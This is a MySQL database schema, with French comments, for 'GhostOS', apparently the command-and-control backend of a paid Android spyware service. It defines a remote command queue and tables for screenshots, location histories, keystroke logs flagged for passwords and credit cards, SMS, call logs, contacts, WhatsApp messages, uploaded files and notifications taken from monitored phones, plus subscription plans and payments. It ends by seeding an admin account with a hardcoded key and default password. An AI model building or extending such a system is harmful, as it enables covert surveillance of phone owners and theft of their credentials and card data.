-- Base de données GhostOS
CREATE DATABASE IF NOT EXISTS ghost_os;
USE ghost_os;

-- ============================================
-- UTILISATEURS
-- ============================================
CREATE TABLE users (
    id INT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(100) UNIQUE NOT NULL,
    email VARCHAR(255) UNIQUE NOT NULL,
    password_hash VARCHAR(255) NOT NULL,
    api_key VARCHAR(255) UNIQUE NOT NULL,
    account_type ENUM('free', 'premium', 'enterprise', 'admin') DEFAULT 'free',
    account_status ENUM('active', 'suspended', 'banned') DEFAULT 'active',
    
    -- Abonnement
    trial_start DATETIME,
    trial_end DATETIME,
    subscription_start DATETIME,
    subscription_end DATETIME,
    
    -- Stats
    devices_count INT DEFAULT 0,
    total_screenshots INT DEFAULT 0,
    total_locations INT DEFAULT 0,
    total_messages INT DEFAULT 0,
    
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    last_login TIMESTAMP NULL,
    last_ip VARCHAR(45),
    
    INDEX idx_api_key (api_key),
    INDEX idx_email (email)
);

-- ============================================
-- APPAREILS
-- ============================================
CREATE TABLE devices (
    id INT AUTO_INCREMENT PRIMARY KEY,
    user_id INT NOT NULL,
    device_id VARCHAR(255) NOT NULL,
    device_name VARCHAR(255),
    manufacturer VARCHAR(100),
    model VARCHAR(100),
    android_version VARCHAR(50),
    sdk_version INT,
    
    -- Statut
    is_online BOOLEAN DEFAULT FALSE,
    last_seen TIMESTAMP NULL,
    battery_level INT,
    network_type VARCHAR(50),
    ip_address VARCHAR(45),
    
    -- Localisation actuelle
    latitude DECIMAL(10,8),
    longitude DECIMAL(11,8),
    location_time TIMESTAMP NULL,
    
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    
    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE,
    UNIQUE KEY unique_device (user_id, device_id),
    INDEX idx_last_seen (last_seen),
    INDEX idx_online (is_online)
);

-- ============================================
-- COMMANDES
-- ============================================
CREATE TABLE commands (
    id INT AUTO_INCREMENT PRIMARY KEY,
    device_id INT NOT NULL,
    command VARCHAR(100) NOT NULL,
    parameters TEXT,
    status ENUM('pending', 'sent', 'executed', 'failed') DEFAULT 'pending',
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    executed_at TIMESTAMP NULL,
    result TEXT,
    error TEXT,
    
    FOREIGN KEY (device_id) REFERENCES devices(id) ON DELETE CASCADE,
    INDEX idx_status (status),
    INDEX idx_device (device_id)
);

-- ============================================
-- SCREENSHOTS
-- ============================================
CREATE TABLE screenshots (
    id INT AUTO_INCREMENT PRIMARY KEY,
    device_id INT NOT NULL,
    file_path VARCHAR(500),
    file_size INT,
    width INT,
    height INT,
    captured_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    
    FOREIGN KEY (device_id) REFERENCES devices(id) ON DELETE CASCADE,
    INDEX idx_device_time (device_id, captured_at)
);

-- ============================================
-- LOCALISATIONS
-- ============================================
CREATE TABLE locations (
    id INT AUTO_INCREMENT PRIMARY KEY,
    device_id INT NOT NULL,
    latitude DECIMAL(10,8) NOT NULL,
    longitude DECIMAL(11,8) NOT NULL,
    accuracy FLOAT,
    altitude DECIMAL(10,2),
    speed FLOAT,
    provider VARCHAR(50),
    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    
    FOREIGN KEY (device_id) REFERENCES devices(id) ON DELETE CASCADE,
    INDEX idx_device_time (device_id, timestamp)
);

-- ============================================
-- KEYLOGS
-- ============================================
CREATE TABLE keylogs (
    id BIGINT AUTO_INCREMENT PRIMARY KEY,
    device_id INT NOT NULL,
    app_package VARCHAR(255),
    text TEXT,
    is_password BOOLEAN DEFAULT FALSE,
    is_credit_card BOOLEAN DEFAULT FALSE,
    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    
    FOREIGN KEY (device_id) REFERENCES devices(id) ON DELETE CASCADE,
    INDEX idx_device_time (device_id, timestamp)
);

-- ============================================
-- SMS
-- ============================================
CREATE TABLE sms_messages (
    id BIGINT AUTO_INCREMENT PRIMARY KEY,
    device_id INT NOT NULL,
    address VARCHAR(50),
    body TEXT,
    type ENUM('inbox', 'sent', 'draft') DEFAULT 'inbox',
    timestamp BIGINT,
    received_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    
    FOREIGN KEY (device_id) REFERENCES devices(id) ON DELETE CASCADE,
    INDEX idx_device (device_id),
    INDEX idx_address (address)
);

-- ============================================
-- APPELS
-- ============================================
CREATE TABLE calls (
    id BIGINT AUTO_INCREMENT PRIMARY KEY,
    device_id INT NOT NULL,
    number VARCHAR(50),
    name VARCHAR(255),
    duration INT,
    type ENUM('incoming', 'outgoing', 'missed') DEFAULT 'incoming',
    timestamp BIGINT,
    received_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    
    FOREIGN KEY (device_id) REFERENCES devices(id) ON DELETE CASCADE,
    INDEX idx_device (device_id)
);

-- ============================================
-- CONTACTS
-- ============================================
CREATE TABLE contacts (
    id INT AUTO_INCREMENT PRIMARY KEY,
    device_id INT NOT NULL,
    contact_id VARCHAR(100),
    name VARCHAR(255),
    phones TEXT,
    emails TEXT,
    photo VARCHAR(500),
    received_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    
    FOREIGN KEY (device_id) REFERENCES devices(id) ON DELETE CASCADE,
    INDEX idx_device (device_id)
);

-- ============================================
-- WHATSAPP
-- ============================================
CREATE TABLE whatsapp_messages (
    id BIGINT AUTO_INCREMENT PRIMARY KEY,
    device_id INT NOT NULL,
    contact VARCHAR(255),
    message TEXT,
    timestamp BIGINT,
    media_path VARCHAR(500),
    received_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    
    FOREIGN KEY (device_id) REFERENCES devices(id) ON DELETE CASCADE,
    INDEX idx_device (device_id)
);

-- ============================================
-- FICHIERS
-- ============================================
CREATE TABLE files (
    id INT AUTO_INCREMENT PRIMARY KEY,
    device_id INT NOT NULL,
    file_path VARCHAR(1000),
    file_name VARCHAR(255),
    file_size BIGINT,
    file_hash VARCHAR(64),
    uploaded_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    
    FOREIGN KEY (device_id) REFERENCES devices(id) ON DELETE CASCADE,
    INDEX idx_device (device_id)
);

-- ============================================
-- NOTIFICATIONS
-- ============================================
CREATE TABLE notifications (
    id BIGINT AUTO_INCREMENT PRIMARY KEY,
    device_id INT NOT NULL,
    package VARCHAR(255),
    title TEXT,
    text TEXT,
    timestamp BIGINT,
    received_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    
    FOREIGN KEY (device_id) REFERENCES devices(id) ON DELETE CASCADE,
    INDEX idx_device (device_id)
);

-- ============================================
-- TRANSACTIONS
-- ============================================
CREATE TABLE transactions (
    id INT AUTO_INCREMENT PRIMARY KEY,
    user_id INT NOT NULL,
    tx_hash VARCHAR(255) UNIQUE,
    amount DECIMAL(10,2),
    currency VARCHAR(20),
    plan VARCHAR(50),
    status ENUM('pending', 'confirmed', 'failed') DEFAULT 'pending',
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    confirmed_at TIMESTAMP NULL,
    
    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
);

-- ============================================
-- LOGS
-- ============================================
CREATE TABLE activity_logs (
    id BIGINT AUTO_INCREMENT PRIMARY KEY,
    user_id INT,
    device_id INT,
    action VARCHAR(100),
    details TEXT,
    ip VARCHAR(45),
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    
    INDEX idx_user (user_id),
    INDEX idx_device (device_id),
    INDEX idx_action (action)
);

-- ============================================
-- ADMIN PAR DÉFAUT
-- ============================================
INSERT INTO users (username, email, password_hash, api_key, account_type) VALUES
('admin', 'admin@ghostos.com', '$2y$10$YourHashedPasswordHere', 'ghost_admin_key_2026', 'admin');
-- Mot de passe par défaut: Admin123!
